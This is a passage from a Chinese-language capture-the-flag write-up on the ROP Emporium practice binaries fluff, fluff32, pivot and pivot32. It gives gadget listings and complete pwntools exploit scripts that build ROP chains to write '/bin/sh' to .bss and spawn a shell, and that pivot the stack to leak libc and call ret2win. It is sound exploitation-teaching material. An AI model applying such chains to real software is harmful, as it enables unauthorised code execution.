      return fgets(&s, 512, stdin);
    }
同样的，我们需要写system的参数到bss段，才能成功getshell
查一波可以的gadget，发现：
    0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xorbyte ptr [r10], r12b ; ret
    0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
    0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
    0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
    0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
    0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
这道题有个比较有趣的地方在于，可以用xor进行写入操作，用一个xor自己清空寄存器A，接着让寄存器B去xor寄存器A，把结果存在寄存器A，就相当于把B赋值给A
这也算是gadget进行间接赋值的时候的新思路
这道题的关键点在于非常巧妙地利用了几个gadget，尤其是通过xor进行寄存器赋值的操作是真的很细节
在找ropgadget的时候用上：ROPgadget –binary ./fluff –depth 20 才能找到更多的gadget
exp如下
    #!python
    #coding:utf-8
    from pwn import *
    context.log_level = "debug"
    p = process("./fluff")
    system = 0x4005e0
    bss = 0x601060
    binsh = '/bin/sh\x00'
    junk = 'a'*8
    gadget1 = 0x40084d 
    #pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
    gadget2 = 0x400822
    #xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
    gadget3 = 0x40082f
    #xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
    gadget4 = 0x400840
    #xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
    gadget5 = 0x400832
    #pop r12 ; mov r13d, 0x604060 ; ret
    payload = 'a'*(0x20+0x08)
    payload += p64(gadget5)
    payload += p64(bss)
    payload += p64(gadget2) +junk
    payload += p64(gadget3) +junk
    payload += p64(gadget4) +junk
    payload += p64(gadget5)
    payload += binsh
    payload += p64(gadget2) +junk
    payload += p64(gadget3) +junk
    payload += p64(gadget1) +p64(bss)+junk +p64(0)
    payload += p64(system)
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
需要注意的是，我们利用的gadget并不是每一条都有用，比如
`xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret`
这里的pop r14 ; mov edi, 0x601050并没有作用
我们需要利用的是xor r11, r11
只要其他的不影响解题，我们填充它为无用字符就行了
# 12.fluff32
原理同上，只需要注意分两次写入bss，这是因为32位程序最多四字节传值
当然如果构造system（/sh）写一次就够了
    #!python
    #coding:utf-8
    from pwn import *
    context.log_level = "debug"
    p = process("./fluff32")
    bss = 0x0804a040
    binsh = "/bin/sh\x00"
    system = 0x08048430
    junk = "a"*4
    gadget1 = 0x08048693
    #mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
    gadget2 = 0x08048671
    #xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
    gadget3 = 0x0804867b
    #xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
    gadget4 = 0x080483e1
    # pop ebx ; ret
    gadget5 = 0x08048689
    #xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
    payload = 'a'*(0x28+0x04)
    #把bss的地址传给ecx
    payload += p32(gadget4)
    payload += p32(bss)
    payload += p32(gadget2)+junk
    payload += p32(gadget3)+junk
    payload += p32(gadget5)+junk
    #把binsh前四个字节写入bss的地址
    payload += p32(gadget4)
    payload += binsh[0:4]
    payload += p32(gadget2)+junk
    payload += p32(gadget3)+junk
    payload += p32(gadget1)+junk+p32(0)
    #把bss+4的地址传给ecx
    payload += p32(gadget4)
    payload += p32(bss+4)
    payload += p32(gadget2)+junk
    payload += p32(gadget3)+junk
    payload += p32(gadget5)+junk
    #把binsh后四个字节写入bss+4的地址
    payload += p32(gadget4)
    payload += binsh[4:8]
    payload += p32(gadget2)+junk
    payload += p32(gadget3)+junk
    payload += p32(gadget1)+junk+p32(0)
    #此时在bss段中已经写好了/bin/sh，然后就调用system函数getshell
    payload += p32(system) +p32(0xdeadbeef)+p32(bss)
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
# 13.pivot
这道题有两次输入，第一次输入存入pivot堆的位置，第二次输入存入栈的位置，第二次输入的可溢出大小明显不够用来构造rop链
所以需要用到[栈迁移的操作](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/#frame-faking)，这里边描述的够详细了
这道题有给出so文件，其中有这个函数
    void __noreturn ret2win()
    {
      system("/bin/cat flag.txt");
      exit(0);
    }
在elf中的函数里面只有foothold_function是也出现在so里面的，它还存在elf的got表中
    .got.plt:0000000000602048 off_602048      dq offset foothold_function
很明显就是要利用这个foothold函数来进行泄漏libc，从而得到ret2win的真实地址，然后去调用这个ret2win函数
由于这个函数没调用，需要调用一次，got表才会存在真正的地址
因此第一次溢出就要先执行foothold函数
其他的就是找gadget进行构造rop了，但其实text段里面有提示  
很明显这个就是一个有用的gadget，剩下的就以这个为线索去找就行了
输入命令 ROPgadget --binary ./pivot --depth 20 配合着--only"xxx"和grep命令去找出这些有用的gadget
    0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
    0x0000000000400b00 : pop rax ; ret
    0x000000000040098e : call rax
    0x0000000000400b09 : add rax, rbp ; ret
    0x0000000000400900 : pop rbp ; ret
    0x0000000000400b02 : xchg rax, rsp ; ret
exp如下：
    #!python
    #coding:utf-8
    from pwn import *
    context.log_level = "debug"
    elf = ELF("./pivot")
    libc = ELF("./libpivot.so")
    p = process("./pivot")
    plt_foothold_function = elf.plt["foothold_function"]
    got_foothold_function = elf.got["foothold_function"]
    libc_foothold_function = libc.symbols["foothold_function"]
    libc_ret2win = libc.symbols["ret2win"]
    offset = libc_ret2win-libc_foothold_function
    mov_rax_rax = 0x0000000000400b05
    pop_rax = 0x0000000000400b00
    call_rax =0x000000000040098e
    add_rax_rbp = 0x0000000000400b09
    pop_rbp = 0x0000000000400900
    xchg_rax_rsp = 0x0000000000400b02
    p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
    heap = int(p.recv(14),16)
    p.recvuntil("> ")
    payload1 = p64(plt_foothold_function)
    payload1 += p64(pop_rax)
    payload1 += p64(got_foothold_function)
    payload1 += p64(mov_rax_rax)
    payload1 += p64(pop_rbp)
    payload1 += p64(offset)
    payload1 += p64(add_rax_rbp)
    payload1 += p64(call_rax)
    p.sendline(payload1)
    p.recvuntil("> ")
    payload2 ='a'*(0x20+0x08)
    payload2 += p64(pop_rax)
    payload2 += p64(heap)
    payload2 += p64(xchg_rax_rsp)
    p.sendline(payload2)
    p.recvuntil("into libpivot.so")
    p.interactive()
# 14.pivot32
原理同上
    #!python
    #coding:utf-8
    from pwn import *
    context.log_level = "debug"
    elf = ELF("./pivot32")
    libc = ELF("./libpivot32.so")
    p = process("./pivot32")
    plt_foothold_function = elf.plt["foothold_function"]
    got_foothold_function = elf.got["foothold_function"]
    libc_foothold_function = libc.symbols["foothold_function"]
    libc_ret2win = libc.symbols["ret2win"]
    offset = libc_ret2win-libc_foothold_function
    print offset
    mov_eax_eax = 0x080488c4
    pop_eax = 0x080488c0
    call_eax =0x080486a3
    add_eax_ebx = 0x080488c7
    pop_ebx = 0x08048571
    xchg_eax_esp = 0x080488c2
    p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
    heap = int(p.recv(10),16)
    p.recvuntil("> ")
    payload1 = p32(plt_foothold_function)
    payload1 += p32(pop_eax)
    payload1 += p32(got_foothold_function)
    payload1 += p32(mov_eax_eax)
    payload1 += p32(pop_ebx)
    payload1 += p32(offset)
    payload1 += p32(add_eax_ebx)
    payload1 += p32(call_eax)
    p.sendline(payload1)
    p.recvuntil("> ")
    payload2 ='a'*(0x28+0x04)
    payload2 += p32(pop_eax)
    payload2 += p32(heap)
    payload2 += p32(xchg_eax_esp)
    p.sendline(payload2)
    p.recvuntil("into libpivot.so")
    p.interactive()
    '''
    0x080488c0 : pop eax ; ret
    0x08048571 : pop ebx ; ret
    0x080488c2 : xchg eax, esp ; ret
    0x080488c4 : mov eax, dword ptr [eax] ; ret
    0x080486a3 : call eax
    0x080488c7 : add eax, ebx ; ret
    '''
其实栈迁移（or栈翻转，栈伪造，其实都是一个意思）我们一般用leave;ret,上面64位有0x0a，所以用不了
上面的stack pivot可以用如下payload：
    leave_ret = 0x080486a8
    p.recvuntil("> ")
    payload = "a" * 40
    payload += p32(heap_addr - 4) 
    #因为后面的leave会pop ebp，所以这减4
    payload += p32(leave_ret)
# 总结
通过这些题目的练习，是可以提高对rop的利用能力的，尤其是在没法遇到pop xxx
ret这样的直接传值gadget的时候，就需要想尽办法去间接的传递赋值，另外我发现ropemporium的官网似乎要全局梯子才能访问，我就把题目打包上去了，方便大家练习